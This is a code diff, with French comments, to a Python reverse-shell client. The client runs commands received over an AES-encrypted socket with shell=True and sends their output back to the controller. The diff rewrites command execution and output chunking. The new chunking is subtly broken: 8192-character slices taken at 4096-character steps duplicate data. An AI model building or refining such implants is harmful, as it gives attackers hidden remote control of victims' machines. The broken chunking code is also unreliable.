@@ -8,7 +8,6 @@ from base64 import b64encode, b64decode
 from aes_crypt import AESCipher  # Import de la classe AESCipher depuis le fichier aes_crypt
 from datetime import datetime
 import logging
-from time import sleep
 
 # Configure logging
 logging.basicConfig(
@@ -194,21 +193,25 @@ class ReverseShellClient:
         self.send_large_data(result)
 
     def send_large_data(self, data):
-        chunks = [data[i : i + 1024] for i in range(0, len(data), 1024)]
+        chunks = [data[i : i + 8192] for i in range(0, len(data), 4096)]
         for chunk in chunks:
             self.conn.send(AESCipher.encrypt(chunk).encode("utf-8"))
         self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
 
     def run_system_command(self, command):
         try:
-            output = subprocess.check_output(
-                command, shell=True, stderr=subprocess.STDOUT
-            )
-            logging.info(f"Command output: {output.decode('utf-8')}")
-            return output.decode('utf-8')
-        except subprocess.CalledProcessError as e:
-            logging.error(f"Command error: {e}")
+            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            stdout, stderr = process.communicate()
+            if process.returncode == 0:
+                logging.info(f"Command output: {stdout.decode('utf-8')}")
+                return stdout.decode('utf-8')
+            else:
+                logging.error(f"Command error: {stderr.decode('utf-8')}")
+                return stderr.decode('utf-8')
+        except Exception as e:
+            logging.error(f"Command execution failed: {e}")
             return str(e)
+
 
 
 if __name__ == "__main__":
